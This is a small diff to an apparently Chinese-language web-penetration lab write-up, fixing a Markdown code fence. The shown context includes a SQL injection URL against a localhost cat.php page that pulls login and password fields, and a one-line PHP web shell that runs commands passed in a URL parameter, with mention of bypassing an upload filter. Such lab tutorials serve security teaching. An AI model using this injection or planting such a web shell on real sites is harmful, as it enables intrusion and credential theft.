@@ -90,7 +90,8 @@ http://127.0.0.1:8080/cat.php?id=3%20union%20select%201,concat(login,%27:%27,pas
 ```php
 <?php
   system($_GET['cmd']);
-  ?>```
+  ?>
+```
 
 - 但是网站返回提示信息，禁止上传PHP文件。可以有如下两种方式绕过PHP过滤
 
